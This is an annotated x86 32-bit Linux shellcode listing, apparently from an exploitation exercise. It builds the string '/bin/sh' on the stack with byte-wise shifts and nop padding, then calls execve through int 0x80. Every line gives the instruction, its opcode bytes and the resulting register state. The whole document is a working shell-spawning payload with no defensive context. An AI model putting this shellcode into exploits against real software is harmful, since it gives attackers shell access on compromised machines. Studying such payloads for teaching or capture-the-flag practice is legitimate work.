push   8             # 6a 08
nop                  # 90
pop    ecx           # 59     => $ecx = 8

xor    eax, eax      # 31 c0  => $eax = 0

mov    al, 0x68      # b0 68  => $eax = 0x00000068
shl    eax, ecx      # d3 e0  => $eax = 0x00006800
mov    al, 0x73      # b0 73  => $eax = 0x00006873
shl    eax, ecx      # d3 e0  => $eax = 0x00687300
mov    al, 0x2f      # b0 2f  => $eax = 0x0068732f ("/sh\0")  

nop                  # 90
push   eax           # 50     => Push "/sh\0"

xor    eax, eax      # 31 c0  => $eax = 0

mov    al, 0x6e      # b0 6e  => $eax = 0x0000006e
shl    eax, ecx      # d3 e0  => $eax = 0x00006e00
mov    al, 0x69      # b0 69  => $eax = 0x00006e69
shl    eax, ecx      # d3 e0  => $eax = 0x006e6900
mov    al, 0x62      # b0 62  => $eax = 0x006e6962
shl    eax, ecx      # d3 e0  => $eax = 0x6e696200
mov    al, 0x2f      # b0 2f  => $eax = 0x6e69622f ("/bin")

nop                  # 90
push   eax           # 50     => Push "/bin"

xor    ecx, ecx      # 31 c9  => $ecx = 0
xor    edx, edx      # 31 d2  => $edx = 0
xor    eax, eax      # 31 c0  => $eax = 0
mov    al, 0x0b      # b0 0b  => $eax = 0x0b
mov    ebx, esp      # 89 e3  => $ebx = *"/bin/sh\0"

int    0x80          # cd 80  => execve
